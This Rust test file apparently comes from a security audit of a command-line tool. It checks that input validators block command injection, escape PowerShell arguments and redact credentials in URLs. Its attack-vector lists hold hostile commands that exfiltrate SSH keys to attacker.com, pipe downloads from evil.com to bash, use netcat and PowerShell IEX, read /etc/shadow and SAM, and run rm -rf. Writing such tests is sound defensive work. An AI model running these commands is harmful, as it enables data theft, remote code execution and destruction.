// SECURITY AUDIT TEST SUITE
// Comprehensive security tests documenting all identified vulnerabilities
// and attack surfaces in the MSC CLI application.
//
// This file serves as:
// 1. Documentation of security findings
// 2. Test suite to prevent regressions
// 3. Guide for security improvements
//
// Severity Levels:
// - CRITICAL: Immediate code execution, data exfiltration
// - HIGH: Privilege escalation, significant data exposure
// - MEDIUM: Information disclosure, DoS potential
// - LOW: Edge cases, theoretical attacks

use msc::core::validation;
use msc::platform::elevation;

// CRITICAL SEVERITY TESTS

#[test]
fn test_critical_alias_command_injection_unix() {
    // CRITICAL: Command injection in Unix alias generator
    // Location: src/core/alias_generator.rs:106-109
    //
    // The Unix alias generator creates bash scripts with unsanitized commands:
    //   exec {alias.command} "$@"
    //
    // This test validates that command injection attacks are blocked
    // while legitimate commands are allowed.

    
    println!("\n🔴 Testing malicious commands (must be blocked):\n");

    // Command separators and chaining
    let command_separators = vec![
        ("echo hello; rm -rf /", "semicolon separator"),
        ("echo test && rm -rf ~/*", "AND operator"),
        ("ls || curl evil.com", "OR operator"),
    ];

    for (cmd, attack_type) in command_separators {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Command substitution
    let command_substitution = vec![
        ("echo `whoami`", "backtick substitution"),
        ("echo $(cat /etc/passwd)", "dollar-paren substitution"),
        (
            "curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)",
            "data exfiltration via substitution",
        ),
    ];

    for (cmd, attack_type) in command_substitution {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Backgrounding and process manipulation
    let backgrounding = vec![
        (
            "python -m http.server 8000 & curl evil.com",
            "background process with chaining",
        ),
        ("sleep 1 &", "background process"),
    ];

    for (cmd, attack_type) in backgrounding {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Pipe attacks
    let pipe_attacks = vec![
        ("echo | /bin/bash -c 'malicious code'", "pipe to shell"),
        ("curl evil.com/malware.sh | bash", "pipe to bash"),
        ("cat /etc/passwd | nc attacker.com 1234", "pipe to netcat"),
    ];

    for (cmd, attack_type) in pipe_attacks {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Redirection attacks
    let redirection_attacks = vec![
        (
            "cat /etc/shadow > /tmp/stolen",
            "output redirection to steal files",
        ),
        (
            "echo malicious > ~/.bashrc",
            "output redirection to modify config",
        ),
        ("cat < /etc/passwd", "input redirection"),
    ];

    for (cmd, attack_type) in redirection_attacks {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Wildcard attacks
    let wildcard_attacks = vec![
        ("rm -rf *", "wildcard deletion"),
        ("cat *.txt", "wildcard expansion"),
        ("chmod 777 /etc/*", "wildcard permission change"),
    ];

    for (cmd, attack_type) in wildcard_attacks {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Path manipulation
    let path_manipulation = vec![
        (
            "export PATH=/tmp:$PATH && malicious_binary",
            "PATH manipulation with execution",
        ),
        (
            "cd ~ && rm -rf important",
            "directory traversal with deletion",
        ),
    ];

    for (cmd, attack_type) in path_manipulation {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    
    println!("\n🟢 Testing legitimate commands (must be allowed):\n");

    let legitimate_commands = vec![
        ("ls -la", "list files with details"),
        ("git status", "check git status"),
        ("cargo build --release", "build Rust project"),
        ("python3 script.py", "run Python script"),
        ("node index.js", "run Node.js script"),
        ("docker ps", "list Docker containers"),
        ("npm install", "install npm packages"),
        ("echo hello world", "simple echo"),
        ("cd /path/to/dir", "change directory"),
        ("python -m venv env", "create Python virtual environment"),
    ];

    for (cmd, description) in legitimate_commands {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_ok(),
            "❌ FAILED to allow legitimate command ({}): {}",
            description,
            cmd
        );
        println!("  ✅ Allowed {}: {}", description, cmd);
    }

    println!("\n✅ All Unix command injection tests passed!\n");
}

#[test]
fn test_critical_alias_command_windows_equivalent() {
    // CRITICAL: Command injection in Windows alias generator
    // On Windows, aliases use shim executables that read from aliases.json
    // The command is still stored unsanitized in JSON and could be exploited
    // if the shim doesn't properly escape when executing
    //
    // This test validates that command injection attacks are blocked
    // while legitimate Windows commands are allowed.

    
    println!("\n🔴 Testing malicious Windows commands (must be blocked):\n");

    // PowerShell injection
    let powershell_injection = vec![
        (
            "notepad & powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"",
            "PowerShell download and execute"
        ),
        (
            "dir & powershell -c Invoke-Expression",
            "PowerShell Invoke-Expression"
        ),
        (
            "echo test & powershell IEX",
            "PowerShell IEX shorthand"
        ),
    ];

    for (cmd, attack_type) in powershell_injection {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // CMD.exe injection
    let cmd_injection = vec![
        (
            "echo hello && calc.exe && curl evil.com",
            "CMD chaining with AND",
        ),
        ("dir || malicious.exe", "CMD chaining with OR"),
        ("notepad & calc", "CMD background execution"),
    ];

    for (cmd, attack_type) in cmd_injection {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // File manipulation and redirection
    let file_manipulation = vec![
        (
            "type C:\\Windows\\System32\\config\\SAM > C:\\temp\\stolen.txt",
            "file redirection to steal data",
        ),
        (
            "echo malicious > C:\\Users\\Public\\startup.bat",
            "output redirection to startup",
        ),
        (
            "del C:\\*.* && echo done",
            "wildcard deletion with chaining",
        ),
    ];

    for (cmd, attack_type) in file_manipulation {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Batch variable expansion
    let batch_variables = vec![
        ("echo %PATH%", "environment variable expansion"),
        ("set VAR=malicious & %VAR%", "variable set and execute"),
        ("echo %USERPROFILE%", "user profile variable"),
    ];

    for (cmd, attack_type) in batch_variables {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // CMD escape character
    let escape_attacks = vec![
        ("dir ^& malicious", "CMD escape character"),
        ("echo test^|more", "escaped pipe"),
    ];

    for (cmd, attack_type) in escape_attacks {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    
    println!("\n🟢 Testing legitimate Windows commands (must be allowed):\n");

    let legitimate_commands = vec![
        ("dir", "list directory contents"),
        ("notepad file.txt", "open file in notepad"),
        ("python script.py", "run Python script"),
        ("node index.js", "run Node.js script"),
        ("cargo build --release", "build Rust project"),
        ("git status", "check git status"),
        ("npm install", "install npm packages"),
        ("echo Hello World", "simple echo"),
        ("cd C:\\Users\\Documents", "change directory"),
        ("code .", "open VS Code"),
    ];

    for (cmd, description) in legitimate_commands {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_ok(),
            "❌ FAILED to allow legitimate Windows command ({}): {}",
            description,
            cmd
        );
        println!("  ✅ Allowed {}: {}", description, cmd);
    }

    println!("\n✅ All Windows command injection tests passed!\n");
}

// HIGH SEVERITY TESTS

#[test]
fn test_high_powershell_argument_injection() {
    use base64::{engine::general_purpose, Engine as _};

    println!("\n🔴 CRITICAL: Testing PowerShell Argument Injection Prevention\n");

    // Test dangerous payloads that MUST be escaped
    let test_cases = vec![
        ("'; Start-Process calc; '", "quote break with semicolon"),
        ("' -Command calc; '", "quote break with PowerShell command"),
        (
            "'; Remove-Item -Recurse C:\\",
            "destructive command injection",
        ),
        ("' | Invoke-Expression", "pipe to IEX"),
        ("'; wget evil.com/backdoor.ps1; '", "remote code download"),
        (
            "'; IEX (curl http://evil.com/payload.ps1); '",
            "remote payload download",
        ),
        ("'|calc.exe", "pipe without space"),
        ("'&calc.exe", "ampersand without space"),
        ("'\nStart-Process calc", "newline separator"),
        ("'; $x='calc'; & $x; '", "variable with call operator"),
    ];

    for (malicious_arg, description) in test_cases {
        println!("  Testing: {}", description);

        let program = "C:\\Windows\\System32\\notepad.exe";
        let cmd = elevation::build_elevation_command(program, &[malicious_arg.to_string()]);

        // ASSERTION 1: Must use EncodedCommand (safe)
        assert!(
            cmd.starts_with("-EncodedCommand "),
            "Must use -EncodedCommand for security, got: {}",
            cmd
        );

        // ASSERTION 2: Must NOT use unsafe parameters
        assert!(
            !cmd.contains("-Command "),
            "Must not use unsafe -Command parameter"
        );
        assert!(!cmd.contains("-File "), "Must not use -File parameter");

        // ASSERTION 3: Extract and validate Base64 payload
        let encoded = cmd
            .strip_prefix("-EncodedCommand ")
            .expect("Must have encoded prefix");

        // Verify it's valid Base64
        let decoded_bytes = general_purpose::STANDARD
            .decode(encoded)
            .expect("EncodedCommand must be valid Base64");

        // ASSERTION 4: Decode UTF-16 LE
        assert_eq!(
            decoded_bytes.len() % 2,
            0,
            "Must be valid UTF-16 (even number of bytes)"
        );

        let decoded_u16: Vec<u16> = decoded_bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();

        let decoded_script = String::from_utf16(&decoded_u16).expect("Must be valid UTF-16 string");

        println!("    Decoded script: {}", decoded_script);

        // ASSERTION 5: Verify proper escaping
        // In PowerShell, single quotes are escaped by doubling them: ' becomes ''
        if malicious_arg.contains('\'') {
            assert!(
                decoded_script.contains("''") || decoded_script.contains("Start-Process"),
                "Single quotes must be properly escaped in decoded script"
            );
        }

        // ASSERTION 6: Verify the dangerous payload is safely contained in ArgumentList
        // The script should have the pattern: -ArgumentList @('...')
        // Even if the payload contains '; it should be inside the ArgumentList array,
        // which means it's treated as a string argument, not executable code
        assert!(
            decoded_script.contains("-ArgumentList @("),
            "Script must use -ArgumentList for safe argument passing"
        );

        // The malicious code should be inside single quotes within the ArgumentList
        // Pattern: -ArgumentList @('escaped malicious payload')
        // This ensures it's treated as data, not code

        println!("    ✅ {} - Properly escaped", description);
    }

    println!("\n✅ All PowerShell injection attacks properly mitigated\n");
}

#[test]
fn test_high_url_credentials_exposure() {
    // HIGH: URLs with embedded credentials should be redacted in logs
    // Location: src/core/validation.rs - redact_url_credentials()
    //
    // This test verifies that credentials are properly redacted from URLs

    println!("\n🔒 Testing URL credentials redaction:\n");

    let test_cases = vec![
        (
            "https://admin:secretP@ssw0rd@private-server.com/video.mp4",
            "https://***:***@private-server.com/video.mp4",
            "complex password with special characters",
        ),
        (
            "https://user:token123@api.example.com/download",
            "https://***:***@api.example.com/download",
            "basic username and token",
        ),
        (
            "http://root:toor@192.168.1.100:8080/secure/file",
            "http://***:***@192.168.1.100:8080/secure/file",
            "IP address with port",
        ),
        (
            "https://john:p@ssword@example.com/path?query=value#fragment",
            "https://***:***@example.com/path?query=value#fragment",
            "URL with query and fragment",
        ),
    ];

    for (original_url, expected_redacted, description) in test_cases {
        // Validate that the URL is technically valid
        let result = validation::validate_url(original_url);
        assert!(
            result.is_ok(),
            "URL with credentials should be valid: {}",
            original_url
        );

        // Test redaction
        let redacted = validation::redact_url_credentials(original_url);

        assert_eq!(
            redacted, expected_redacted,
            "Failed to properly redact credentials for: {}",
            description
        );

        // Verify that credentials are NOT in the redacted version
        assert!(
            !redacted.contains("admin")
                && !redacted.contains("secretP@ssw0rd")
                && !redacted.contains("user")
                && !redacted.contains("token123")
                && !redacted.contains("root")
                && !redacted.contains("toor")
                && !redacted.contains("john")
                && !redacted.contains("p@ssword"),
            "Redacted URL still contains credentials: {}",
            redacted
        );

        println!("  ✅ Redacted {} successfully", description);
        println!("     Original:  {}", original_url);
        println!("     Redacted:  {}", redacted);
        println!();
    }

    // Test URLs without credentials (should remain unchanged)
    println!("🔓 Testing URLs without credentials (should remain unchanged):\n");

    let urls_without_creds = vec![
        ("https://example.com/path", "regular URL"),
        ("http://192.168.1.1:8080/api", "IP with port"),
        (
            "https://youtube.com/watch?v=abc123",
            "URL with query params",
        ),
    ];

    for (url, description) in urls_without_creds {
        let redacted = validation::redact_url_credentials(url);
        assert_eq!(
            redacted, url,
            "URL without credentials should not be modified: {}",
            description
        );
        println!("  ✅ {} - unchanged: {}", description, url);
    }

    println!("\n✅ All URL credential redaction tests passed!\n");
}

// MEDIUM SEVERITY TESTS

#[test]
fn test_medium_url_validation_bypass_query_params() {
    // MEDIUM: URL validation can be bypassed using query parameters
    // Location: src/core/validation.rs:52-57
    //
    // Current validation checks for "& " or " &" but allows other patterns

    let bypass_attempts = vec![
        // Command injection in query params (might not work with yt-dlp, but not validated)
        "https://youtube.com/watch?v=abc&cmd=`whoami`",
        "https://example.com?param=value&;rm -rf /",
        "https://example.com?test=$(/bin/bash -c 'evil')",
        // Special characters in fragments
        "https://example.com#fragment;curl evil.com",
        "https://example.com#`whoami`",
    ];

    for url in bypass_attempts {
        let result = validation::validate_url(url);

        if result.is_ok() {
            println!("⚠️  MEDIUM: URL validation bypassed: {}", url);
        }

        // Note: yt-dlp likely sanitizes these, but our validation doesn't catch them
    }
}

// LOW SEVERITY TESTS

#[test]
fn test_low_case_sensitive_protocol() {
    // LOW: Protocol validation is case-sensitive
    // Location: src/core/validation.rs:28-33
    //
    // URLs with uppercase protocols are rejected

    let urls = vec![
        "HTTP://example.com",
        "HTTPS://example.com",
        "HtTpS://example.com",
    ];

    for url in urls {
        let result = validation::validate_url(url);
        assert!(result.is_err(), "Should reject uppercase protocol: {}", url);

        // This is fine (browsers normalize), but documenting the behavior
    }
}

#[test]
fn test_low_url_length_dos() {
    // LOW: Extremely long URLs could cause DoS
    // Location: src/core/validation.rs:60-66
    //
    // Current limit: 2048 characters (good)

    let long_url = format!("https://{}.com", "a".repeat(10000));
    let result = validation::validate_url(&long_url);

    assert!(result.is_err(), "Should reject extremely long URL");
    assert!(result.unwrap_err().to_string().contains("too long"));

    // ✅ Already properly mitigated
}

#[test]
fn test_low_directory_path_validation_edge_cases() {
    // LOW: Edge cases in directory validation
    // Location: src/core/validation.rs:154-205

    let edge_cases = vec![
        // Whitespace-only (rejected ✅)
        "   ", "\t\t", "\n", // Valid but unusual
        ".", "..", // Interesting: should this be allowed?
        // Hidden directories (Unix)
        ".hidden", "..hidden",
    ];

    for path in edge_cases {
        let result = validation::validate_directory_path(path);
        println!("Directory '{}' -> {:?}", path.escape_default(), result);
    }
}

// SAFE OPERATIONS (Already Well Protected)

#[test]
fn test_safe_path_traversal_protection() {
    // ✅ SAFE: Path traversal is well protected

    let traversal_attempts = vec![
        "../../../etc/passwd",
        "..\\..\\Windows\\System32",
        "videos/../../../sensitive",
    ];

    for path in traversal_attempts {
        let result = validation::validate_output_path(path);
        assert!(
            result.is_err(),
            "Correctly rejects path traversal: {}",
            path
        );
    }

    println!("✅ Path traversal protection: EXCELLENT");
}

#[test]
fn test_safe_null_byte_injection() {
    // ✅ SAFE: Null bytes are properly rejected

    let _null_byte_attempts = [
        String::from_utf8_lossy(b"path\0malicious").into_owned(),
        String::from_utf8_lossy(b"https://example.com\0evil").into_owned(),
    ];

    assert!(validation::validate_url("https://example.com\0").is_err());
    assert!(validation::validate_output_path("video\0.mp4").is_err());

    println!("✅ Null byte protection: EXCELLENT");
}

#[test]
fn test_safe_absolute_path_rejection() {
    // ✅ SAFE: Absolute paths properly rejected for output

    let absolute_paths = vec![
        "/etc/passwd",
        "C:\\Windows\\System32\\config",
        "/var/log/secrets",
    ];

    for path in absolute_paths {
        let result = validation::validate_output_path(path);
        assert!(result.is_err(), "Correctly rejects absolute path: {}", path);
    }

    println!("✅ Absolute path rejection: EXCELLENT");
}
